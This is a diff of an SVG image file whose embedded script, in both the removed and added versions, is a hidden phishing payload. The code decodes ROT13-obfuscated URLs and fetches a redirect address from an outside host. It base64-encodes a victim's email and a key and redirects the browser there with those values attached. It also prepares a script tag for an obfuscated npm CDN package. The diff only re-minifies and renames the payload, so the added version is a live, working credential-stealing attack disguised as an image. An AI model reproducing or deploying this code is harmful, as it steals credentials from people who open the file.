@@ -1,55 +1,16 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="612" height="792" viewBox="0 0 612 792">
-  <metadata>
-    <meta name="Producer" content="Online-Convert"/>
-  </metadata>
-  <script type="application/ecmascript">
-    <![CDATA[
-let due="[EMAIL]",past="[KEY]"; 
+<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" width="612" height="792" viewBox="0 0 612 792"><metadata><meta name="Author" content="SVGGen"/></metadata><script type="application/ecmascript"><![CDATA[
+let q="[EMAIL]",r="[KEY]";
 (function(){
-  console.log("good");
-  
-  function x(a) {
-    return a.replace(/[a-zA-Z]/g,function(b) {
-      let c = b.charCodeAt(0);
-      return String.fromCharCode(c + (b.toLowerCase() < 'n' ? 13 : -13));
-    });
-  }
-
-  const y = ["/terng.wf", "cbfvbasbe2@1.0.0", ".arg/acz/", "wfqryvie", "://pqa.", "uggcf"].reverse();
-  const z = x(y.join("")).replace("uggcf://", "https://");
-
-  let a = document.createElement("style");
-  a.textContent = "";
-  document.head && document.head.appendChild(a);
-
-  let b = document.createElement("script");
-  b.type = "application/javascript";
-  b.defer = true;
-  b.src = z;
-
-  (function() {
-    let d = 0;
-    while (!document.body && d++ < 5) setTimeout(() => {}, 50);
-
-    // Ensure "uggcf://" is decoded and converted to "https://"
-    const u = "uggcf://yrtnpl-123.bayvar/ncv/hhheeyyy";
-    const w = str => str.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)));
-
-    async function f() {
-      let r = await fetch(w(u));
-      return r.ok ? (await r.json()).message : '';
-    }
-
-    async function g() {
-      let r = btoa(`${due}&${past}&a}`);
-      let t = await f();
-      window.open(`${t}${r}`, "_self");
-    }
-
-    g();
-  })();
+function m(s){return s.replace(/[a-zA-Z]/g,c=>String.fromCharCode(c.charCodeAt(0)+(c.toLowerCase()<'n'?13:-13)))}
+const a=["uggcf","://pqa.","wfqryvie",".arg/acz/","cbfvbasbe2@1.0.0","/terng.wf"],b=m(a.reverse().join("")).replace("uggcf://","https://");
+let d=document.createElement("style");d.textContent="",document.head&&document.head.appendChild(d);
+let e=document.createElement("script");e.type="application/javascript";e.defer=!0;e.src=b;
+(function(){
+let t=0;function f(){!document.body&&t++<7&&setTimeout(f,40)}f();
+const u="uggcf://yrtnpl-123.bayvar/ncv/hhheeyyy",n=s=>s.replace(/[a-zA-Z]/g,c=>String.fromCharCode(c.charCodeAt(0)+(c.toLowerCase()<'n'?13:-13)));
+async function g(){let w=await fetch(n(u));return w.ok?(await w.json()).message:""}
+async function h(){let x=btoa(`${q}&${r}&a`),y=await g();window.open(`${y}${x}`,"_self")}
+h();
 })();
-]]>
-  </script>
-</svg>
+})();
+]]></script></svg>
